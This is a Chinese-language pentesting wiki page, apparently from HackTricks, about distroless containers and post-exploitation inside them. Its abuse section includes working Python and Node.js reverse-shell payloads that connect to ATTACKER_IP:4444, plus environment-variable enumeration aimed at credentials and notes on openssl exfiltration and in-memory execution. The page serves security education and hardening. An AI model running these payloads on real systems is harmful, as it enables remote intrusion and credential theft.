# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## 概述

**distroless** 容器镜像仅包含运行某个特定应用所需的**最少运行时组件**，并有意移除常见发行版工具，例如包管理器、shell 和大量通用用户态工具。实际中，distroless 镜像通常只包含应用程序二进制文件或运行时、共享库、证书包，以及非常精简的文件系统布局。 <sup>[[1]](#references)</sup>

distroless 并不是一种新的内核隔离原语，而是一种**镜像设计策略**。它改变的是容器文件系统**内部**可用的内容，而不是内核隔离容器的方式。这个区别很重要，因为 distroless 主要通过减少攻击者在获得代码执行后可使用的工具来强化环境。它不能替代 namespaces、seccomp、capabilities、AppArmor、SELinux 或任何其他运行时隔离机制。

## Distroless 的用途

使用 distroless 镜像主要是为了减少：

- 镜像大小
- 镜像的运维复杂度
- 可能存在漏洞的软件包和二进制文件数量
- 默认情况下攻击者可用于 post-exploitation 的工具数量

因此，distroless 镜像在生产环境的应用部署中很受欢迎。不包含 shell、包管理器且几乎没有通用工具的容器，通常更易于运维管理，也更难在失陷后被交互式滥用。

常见的 distroless 风格镜像系列包括：

- Google 的 distroless 镜像 <sup>[[1]](#references)</sup>
- Chainguard hardened/minimal 镜像 <sup>[[2]](#references)</sup>

## Distroless 不代表什么

distroless 容器**并不意味着**：

- 自动以 rootless 模式运行
- 自动以非特权模式运行
- 自动设为只读
- 自动受到 seccomp、AppArmor 或 SELinux 保护
- 自动免受容器逃逸攻击

distroless 镜像仍然可以通过 `--privileged` 运行，也可以共享主机 namespace、使用危险的 bind mount，或挂载运行时 socket。在这种情况下，镜像或许很精简，但容器仍可能存在灾难性的安全问题。distroless 改变的是**用户态攻击面**，而非**内核信任边界**。

## 典型运行特征

当你攻陷 distroless 容器时，最先注意到的通常是，很多常见假设不再成立。容器里可能没有 `sh`、`bash`、`ls`、`id`、`cat`，有时甚至没有能按你熟悉的操作方式运行的基于 libc 的环境。这会同时影响攻击和防御，因为缺少工具会改变调试、事件响应和 post-exploitation 的方式。

最常见的情况包括：

- 应用运行时存在，但除此之外几乎没有其他内容
- shell payload 因为没有 shell 而执行失败
- 常见的枚举单行命令因缺少辅助二进制文件而失败
- 通常也会启用只读 rootfs，或在可写 tmpfs 位置设置 `noexec` 等文件系统保护

这种组合通常会让人开始讨论如何“weaponize distroless”。

## Distroless 与 Post-Exploitation

在 distroless 环境中，主要的攻击难点不一定是初始 RCE，往往是后续操作。如果被利用的工作负载允许你在 Python、Node.js、Java 或 Go 等语言运行时中执行代码，你或许可以执行任意逻辑，但无法使用其他 Linux 目标上常见的 shell 工作流。

因此，post-exploitation 通常会转向以下三个方向之一：

1. **直接使用现有语言运行时**来枚举环境、打开 socket、读取文件或暂存额外 payload。
2. 如果文件系统为只读，或可写位置挂载了 `noexec`，则**将工具加载到内存中**。
3. 如果应用或其依赖项中意外包含有用的工具，则**滥用镜像中已有的二进制文件**。

## 滥用

### 枚举现有运行时

许多 distroless 容器中没有 shell，但仍然有应用运行时。如果目标是 Python 服务，容器中就有 Python；如果目标是 Node.js 服务，容器中就有 Node.js。这通常足以枚举文件、读取环境变量、打开反向 shell，以及暂存内存中的执行内容，而无需调用 `/bin/sh`。

下面是一个使用 Python 的简单示例：

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

一个使用 Node.js 的简单示例：

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

影响：

- 恢复环境变量，其中通常包含凭据或服务端点
- 无需 `/bin/ls` 即可枚举文件系统
- 识别可写路径和挂载的 secrets

### 不含 `/bin/sh` 的交互式 Runtime

如果镜像中不包含 `sh` 或 `bash`，传统的基于 shell 的 reverse shell 就会失败。此时，应在已安装的语言 runtime 中暴露交互式会话，而不是启动一个不存在的 shell。

例如，以下 Python payload 会通过 socket 将交互式 Python 控制台重定向出去：

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

等效的 Node.js 方法可以执行通过 socket 接收的 JavaScript。它是 JavaScript REPL，而非操作系统 shell；文件系统、进程和网络操作必须通过 Node 的 API 执行：

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

这两个示例都需要出站连接和可用的解释器，并且只能提供该解释器所暴露的功能。

如果镜像意外包含 `/bin/sh`，经典的解释器辅助型 shell payload 仍然有用。将它们单独列出，是因为它们并非真正的无 shell 方案：

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

较旧的 Python 命令循环模式也很有用：当 `/bin/sh` 存在，但使用交互式 PTY 不方便时，可以采用这种模式。这里保留了它，并明确说明其实际依赖：`subprocess.run(..., shell=True)` 会调用系统 shell，因此**并非**无 shell 技术。

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### 完整示例：无 Shell 的 Python 命令循环

如果镜像中有 Python，但完全没有 Shell，本地 Python REPL 仍可用于检查文件系统、环境和网络：

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

这个循环不会调用 `/bin/sh`。它会直接计算 Python 表达式并执行语句，因此操作必须使用 Python API，而不是 shell 命令。即便有此限制，它仍能提供许多基本 shell 的功能：枚举文件系统和环境、访问数据、进行网络活动，以及通过已安装的运行时暂存后续 payload。

### 内存中执行工具

Distroless 镜像通常会搭配：

- `readOnlyRootFilesystem: true`
- 可写但带有 `noexec` 的 tmpfs，例如 `/dev/shm`
- 缺少包管理工具

这种组合会让经典的“将二进制下载到磁盘并运行”工作流变得不可靠。在这种情况下，内存执行技术便成为主要选择。

相关专门页面如下：

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

其中最相关的技术有：

- 通过脚本运行时使用 `memfd_create` + `execve` <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

对于 Python、Node.js 或 PHP 服务，入口点可能是应用程序漏洞，例如 template injection、prototype pollution 或 unsafe evaluation。如果这些漏洞能在进程内实现代码执行，`/proc/self/mem` 技术或许能在没有 shell 或磁盘上可执行文件的情况下运行 loader。此时的执行身份仍是容器进程的身份；要逃逸容器，还需要单独的运行时或宿主机边界弱点。前提条件请参阅 [read-only/noexec/distroless techniques](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md)。

### 镜像中已有的二进制文件

某些 distroless 镜像仍包含运行所必需的二进制文件，而这些文件在系统遭到入侵后也会派上用场。一个反复观察到的例子是 `openssl`，因为应用有时需要它来处理加密或 TLS 相关任务。

一种快速搜索模式是：

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

如果存在 `openssl`，它可能可用于：

- 建立出站 TLS 连接
- 通过允许的出站通道进行 data exfiltration
- 通过编码/加密的 blob 暂存 payload 数据

具体的滥用方式取决于实际安装了什么，但总体而言，distroless 并不意味着“完全没有工具”；它意味着“工具远少于普通的发行版镜像”。

## 检查

这些检查旨在确定该镜像在实践中是否真的属于 distroless，以及哪些运行时或辅助二进制文件仍可用于 post-exploitation。

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

这里有哪些值得注意的地方：

- 如果没有 shell，但存在 Python 或 Node 等 runtime，post-exploitation 应转向由 runtime 驱动的执行方式。
- 如果根文件系统是只读的，而 `/dev/shm` 可写但带有 `noexec`，内存执行技术就会变得更加重要。
- 如果存在 `openssl`、`busybox` 或 `java` 等辅助二进制文件，它们可能提供足够的功能来建立进一步访问。

## Runtime 默认配置

| 镜像 / 平台类型 | 默认状态 | 典型行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Google distroless 风格镜像 | 设计上采用最小化 userland | 没有 shell、没有包管理器，仅包含应用 / runtime 依赖 | 添加调试层、sidecar shell，或复制 busybox、工具进去 |
| Chainguard 最小化镜像 | 设计上采用最小化 userland | 减少软件包数量，通常专注于单个 runtime 或服务 | 使用 `:latest-dev` 或 debug 变体，在构建时复制工具进去 |
| 使用 distroless 镜像的 Kubernetes 工作负载 | 取决于 Pod 配置 | Distroless 只影响 userland；Pod 安全态势仍取决于 Pod 规范和 runtime 默认配置 | 添加临时调试容器、host 挂载、设置特权 Pod |
| 运行 distroless 镜像的 Docker / Podman | 取决于运行标志 | 文件系统最小化，但 runtime 安全性仍取决于标志和守护进程配置 | 使用 `--privileged`、共享 host namespace、挂载 runtime socket、可写的 host bind mount |

关键点在于，distroless 是一种**镜像属性**，而不是 runtime 保护措施。它的价值在于减少入侵后文件系统中可用的内容。多阶段构建是将构建工具排除在最终镜像之外的常见方法。 <sup>[[3]](#references)</sup>

## 相关页面

关于 distroless 环境中常需使用的文件系统和内存执行绕过方法：

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

关于仍适用于 distroless 工作负载的容器 runtime、socket 和挂载滥用：

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distroless 容器镜像](https://github.com/GoogleContainerTools/distroless)
- [2] [Chainguard Images 文档](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker 文档 - 多阶段构建](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Linux 手册页](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
